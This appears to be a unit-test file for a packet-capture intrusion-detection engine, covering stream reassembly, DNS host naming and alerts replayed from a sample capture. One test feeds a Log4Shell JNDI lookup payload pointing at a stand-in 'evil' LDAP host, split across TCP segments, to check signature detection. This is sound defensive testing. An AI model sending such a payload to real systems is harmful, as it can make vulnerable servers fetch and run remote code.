#include <gtest/gtest.h>

#include <algorithm>

#include "Builders.h"
#include "analysis/Engine.h"
#include "capture/Capture.h"
#include "ui/Dashboard.h"

namespace pm {
extern const char* const kDefaultSignatures;
}

using namespace pm;
using namespace pmtest;

namespace {

constexpr int64_t kSec = 1000000;

struct Harness {
    SignatureSet sigs;
    std::unique_ptr<Engine> engine;
    int64_t t = 1'800'000'000LL * kSec;

    Harness() {
        std::string error;
        sigs.parse(kDefaultSignatures, error);
        EngineConfig cfg;
        cfg.localAddresses = {ip("192.168.1.10")};
        engine = std::make_unique<Engine>(cfg, &sigs, nullptr);
    }
    void send(const IpAddr& src, uint16_t sport, const IpAddr& dst, uint16_t dport, uint32_t seq, uint32_t ack,
              uint8_t flags, const Bytes& payload = {}) {
        Bytes f = ethernet(0x0800, ipv4(src, dst, kProtoTcp, tcp(sport, dport, seq, ack, flags, payload)));
        PacketRecordHeader h{0, uint32_t(f.size()), uint32_t(f.size()), 0, t};
        engine->process(h, f.data());
        t += 1000;
    }
    void sendUdp(const IpAddr& src, uint16_t sport, const IpAddr& dst, uint16_t dport, const Bytes& payload) {
        Bytes f = ethernet(0x0800, ipv4(src, dst, kProtoUdp, udp(sport, dport, payload)));
        PacketRecordHeader h{0, uint32_t(f.size()), uint32_t(f.size()), 0, t};
        engine->process(h, f.data());
        t += 1000;
    }
    std::shared_ptr<const Snapshot> finish() {
        engine->finish();
        return engine->snapshot();
    }
};

const IpAddr kMe = ip("192.168.1.10");

}  // namespace

TEST(Engine, ReassemblesAClientHelloSplitAcrossSegments) {
    Harness h;
    const IpAddr server = ip("93.184.216.34");
    Bytes hello = clientHello("split.example.com", 1500);
    h.send(kMe, 50000, server, 443, 100, 0, kTcpSyn);
    h.send(server, 443, kMe, 50000, 900, 101, kTcpSyn | kTcpAck);
    h.send(kMe, 50000, server, 443, 101, 901, kTcpAck);
    Bytes first(hello.begin(), hello.begin() + 1448), second(hello.begin() + 1448, hello.end());
    h.send(kMe, 50000, server, 443, 101, 901, kTcpAck | kTcpPsh, first);
    h.send(kMe, 50000, server, 443, 101, 901, kTcpAck | kTcpPsh, first);  // a retransmission
    h.send(kMe, 50000, server, 443, 101 + 1448, 901, kTcpAck | kTcpPsh, second);
    auto snap = h.finish();
    ASSERT_EQ(snap->flows.size(), 1u);
    EXPECT_EQ(snap->flows[0].host, "split.example.com");
    EXPECT_STREQ(snap->flows[0].service, "TLS");
    EXPECT_EQ(snap->flows[0].remote, "93.184.216.34:443");
}

TEST(Engine, SignatureAcrossSegmentsAlertsOnceDespiteRetransmission) {
    Harness h;
    const IpAddr server = ip("203.0.113.9");
    h.send(kMe, 40000, server, 80, 0, 0, kTcpSyn);
    h.send(server, 80, kMe, 40000, 5000, 1, kTcpSyn | kTcpAck);
    h.send(kMe, 40000, server, 80, 1, 5001, kTcpAck, text("GET /x HTTP/1.1\r\nHost: t.example\r\n\r\n"));
    Bytes a = text("HTTP/1.1 200 OK\r\n\r\n?q=${jn"), b = text("di:ldap://evil/a}");
    h.send(server, 80, kMe, 40000, 5001, 40, kTcpAck | kTcpPsh, a);
    h.send(server, 80, kMe, 40000, 5001, 40, kTcpAck | kTcpPsh, a);
    h.send(server, 80, kMe, 40000, 5001 + uint32_t(a.size()), 40, kTcpAck | kTcpPsh, b);
    h.send(server, 80, kMe, 40000, 5001 + uint32_t(a.size()), 40, kTcpAck | kTcpPsh, b);
    auto snap = h.finish();
    ASSERT_EQ(h.engine->alerts().size(), 1u);
    const Alert& alert = h.engine->alerts().front();
    EXPECT_EQ(alert.kind, AlertKind::Signature);
    EXPECT_NE(alert.title.find("Log4Shell"), std::string::npos);
    EXPECT_EQ(alert.src, "203.0.113.9:80");
    EXPECT_NE(alert.message.find("t.example"), std::string::npos) << "the Host header names the flow";
    EXPECT_STREQ(snap->flows.at(0).service, "HTTP");
}

TEST(Engine, AGapResetsTheStreamInsteadOfJoiningUnrelatedBytes) {
    Harness h;
    const IpAddr server = ip("203.0.113.9");
    h.send(kMe, 40001, server, 80, 0, 0, kTcpSyn);
    h.send(server, 80, kMe, 40001, 5000, 1, kTcpSyn | kTcpAck);
    h.send(server, 80, kMe, 40001, 5001, 1, kTcpAck, text("xx${jn"));
    // 100 bytes went missing from the capture before this segment.
    h.send(server, 80, kMe, 40001, 5001 + 6 + 100, 1, kTcpAck, text("di:"));
    h.finish();
    EXPECT_TRUE(h.engine->alerts().empty());
}

TEST(Engine, NamesFlowsFromDnsAnswersAndCountsDirection) {
    Harness h;
    const IpAddr resolver = ip("192.168.1.1"), cdn = ip("151.101.2.248");
    h.sendUdp(resolver, 53, kMe, 53000, dnsResponse("audio.example.com", {cdn}, "a1.cdn.example.net"));
    h.send(kMe, 50001, cdn, 443, 1, 0, kTcpSyn);
    h.send(cdn, 443, kMe, 50001, 1, 2, kTcpSyn | kTcpAck, Bytes(0));
    h.send(cdn, 443, kMe, 50001, 2, 2, kTcpAck, Bytes(1000, 0x17));
    auto snap = h.finish();
    EXPECT_EQ(h.engine->hostFor(cdn), "audio.example.com");
    auto it = std::find_if(snap->flows.begin(), snap->flows.end(),
                           [](const FlowRow& r) { return r.remote == "151.101.2.248:443"; });
    ASSERT_NE(it, snap->flows.end());
    EXPECT_EQ(it->host, "audio.example.com");
    EXPECT_GT(it->totalIn, 1000u);
    EXPECT_LT(it->totalOut, 100u);
    ASSERT_FALSE(snap->lookups.empty());
    EXPECT_EQ(snap->lookups[0].name, "audio.example.com");
}

// ---- The sample capture, end to end -----------------------------------------

namespace {

struct SampleRun {
    std::unique_ptr<Engine> engine;
    std::shared_ptr<const Snapshot> snap;
};

SampleRun runSample() {
    static SignatureSet sigs;
    std::string error;
    if (!sigs.size()) sigs.parse(kDefaultSignatures, error);
    static RecordedOwners owners;
    if (!owners.size()) owners.load(std::string(PM_SAMPLE_PCAP) + ".apps", error);

    Capture cap;
    EXPECT_TRUE(cap.openFile(PM_SAMPLE_PCAP, error)) << error;
    cap.setReplaySpeed(0);
    EngineConfig cfg;
    cfg.linkType = cap.linkType();
    cfg.localAddresses = owners.localAddresses();
    SampleRun r;
    r.engine = std::make_unique<Engine>(cfg, &sigs, &owners);
    cap.run(
        [&](int64_t ts, const uint8_t* d, uint32_t c, uint32_t w) {
            PacketRecordHeader h{0, c, w, 0, ts};
            r.engine->process(h, d);
        },
        error);
    r.engine->finish();
    r.snap = r.engine->snapshot();
    return r;
}

}  // namespace

TEST(Sample, FindsEveryIncidentOnceInOrder) {
    auto run = runSample();
    const auto& alerts = run.engine->alerts();
    std::vector<std::string> titles;
    for (const auto& a : alerts) titles.push_back(a.title);
    ASSERT_EQ(alerts.size(), 5u) << ::testing::PrintToString(titles);
    EXPECT_EQ(alerts[0].title, "Password sent unencrypted (HTTP Basic auth)");
    EXPECT_EQ(alerts[1].kind, AlertKind::PortScan);
    EXPECT_EQ(alerts[1].src, "192.168.1.44");
    EXPECT_EQ(alerts[2].title, "EICAR antivirus test file");
    EXPECT_EQ(alerts[2].src, "203.0.113.80:80");
    EXPECT_EQ(alerts[3].kind, AlertKind::TrafficSpike);
    EXPECT_NE(alerts[3].message.find("Inbound"), std::string::npos);
    EXPECT_EQ(alerts[4].kind, AlertKind::SynFlood);
    EXPECT_EQ(alerts[4].dst, "192.168.1.23:3000");
}

TEST(Sample, KnowsHostsAppsAndLookups) {
    auto run = runSample();
    const Engine& e = *run.engine;
    EXPECT_EQ(e.hostFor(ip("142.250.187.238")), "www.youtube.com");  // the question, not the CNAME
    EXPECT_EQ(e.hostFor(ip("2a00:1450:4009:81e::200e")), "rr4---sn-q0cedn7s.googlevideo.com");

    const Snapshot& s = *run.snap;
    auto app = [&](const std::string& name) -> const GroupRow* {
        for (const auto& g : s.apps) {
            if (g.name == name) return &g;
        }
        return nullptr;
    };
    ASSERT_NE(app("Google Chrome"), nullptr);
    ASSERT_NE(app("softwareupdated"), nullptr);
    EXPECT_GT(app("softwareupdated")->totalIn, 300'000'000u);
    EXPECT_GT(app("Google Chrome")->totalIn, 100'000'000u);
    ASSERT_NE(app("curl"), nullptr);

    bool github = false;
    for (const auto& h : s.hosts) github |= h.name == "github.com";
    EXPECT_TRUE(github);
    bool failed = false;
    for (const auto& l : s.lookups) failed |= l.name == "telemetry.nonexistent-vendor.io" && l.failed;
    EXPECT_TRUE(failed);
    EXPECT_EQ(s.malformed, 0u);
    EXPECT_GT(s.history.size(), 170u);
}

TEST(Sample, ReplayIsDeterministic) {
    auto a = runSample(), b = runSample();
    ASSERT_EQ(a.engine->alerts().size(), b.engine->alerts().size());
    for (size_t i = 0; i < a.engine->alerts().size(); i++) {
        EXPECT_EQ(alertToJson(a.engine->alerts()[i]), alertToJson(b.engine->alerts()[i]));
    }
    EXPECT_EQ(a.engine->bytes(), b.engine->bytes());
}

TEST(Sample, DashboardShowsIt) {
    auto run = runSample();
    Dashboard dash([&] { return run.snap; }, "replay");
    Screen s;
    s.resize(120, 40);
    dash.draw(s, *run.snap);
    std::string all;
    for (int y = 0; y < 40; y++) all += s.rowText(y) + "\n";
    for (const char* want : {"Throughput", "Connections", "Protocols", "Lookups", "Alerts", "SYN flood"}) {
        EXPECT_NE(all.find(want), std::string::npos) << want << "\n" << all;
    }
}
